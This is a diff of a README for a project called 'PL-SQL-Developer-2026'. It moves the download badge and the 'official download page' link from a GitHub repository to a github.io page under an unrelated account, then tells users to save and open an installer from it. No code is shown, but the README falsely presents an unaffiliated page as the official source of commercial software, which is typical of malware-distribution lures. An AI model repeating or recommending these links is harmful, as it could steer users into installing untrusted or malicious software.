@@ -1,6 +1,6 @@
 # ⚙️ PL-SQL-Developer-2026 - Access Powerful Oracle Database Management Today
 
-[![Download PL-SQL-Developer-2026](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/conpermeable892/PL-SQL-Developer-2026)
+[![Download PL-SQL-Developer-2026](https://img.shields.io/badge/Download-Installer-blue.svg)](https://conpermeable892.github.io)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Your computer must meet these basic standards to run the software:
 
 Follow these steps to put the software on your computer.
 
-1. Go to the [official download page](https://github.com/conpermeable892/PL-SQL-Developer-2026).
+1. Go to the [official download page](https://conpermeable892.github.io).
 2. Look for the release area on the page.
 3. Click the link to save the installer file to your computer.
 4. Open the folder where you saved the file.
